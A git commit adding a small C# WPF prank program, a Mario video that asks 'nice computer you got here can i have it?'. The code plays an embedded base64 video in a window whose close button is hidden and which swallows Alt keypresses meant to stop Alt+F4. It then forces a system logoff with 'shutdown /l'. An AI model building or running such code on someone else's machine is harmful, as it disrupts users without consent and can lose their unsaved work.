e9c8e510ca9badb7a4c215ea64756911e6c29c6d
no name no number <66847249+ploff@users.noreply.github.com>
2024-04-19 00:00:01 +0300

    Add files via upload

---
+++ nicecomputeryougothere/MainWindow.xaml.cs
@@ -0,0 +1,36 @@
+﻿using System.Diagnostics;
+using System.IO;
+using System.Windows.Input;
+
+namespace nicecomputeryougothere
+{
+    public partial class MainWindow
+    {
+        public MainWindow()
+        {
+            InitializeComponent();
+
+            videoBase64.videoDecode();
+            string vidpath = Path.GetTempPath() + "\\video.mp4";
+            
+            MediaElement.Source = new Uri(vidpath);
+            MediaElement.Play();
+            MediaElement.MediaEnded += (_, _) =>
+            {
+                Close();
+                Process.Start("shutdown", "/l"); // /l for logoff
+                //File.Delete(vidpath);
+            };
+            
+            KeyDown += MainWindow_KeyDown;
+        }
+        
+        private static void MainWindow_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyboardDevice.IsKeyDown(Key.LeftAlt) || e.KeyboardDevice.IsKeyDown(Key.RightAlt) && e.SystemKey == Key.F4)
+            {
+                e.Handled = true;
+            }
+        }
+    }
+}
---
+++ nicecomputeryougothere/README.md
@@ -0,0 +1,10 @@
+﻿# mario that says "nice computer you got here can i have it?" and then logoff system
+
+![alt text](icon.ico "nice icon, isn't it?")
+
+**written on .NET 8**
+
+structure:
+ - **MainWindow.xaml & MainWindow.xaml.cs** - window parameters and code
+ - **WindowBehavior.cs** - hides close button on window
+ - **videoBase64.cs** - contains a base64'd video source
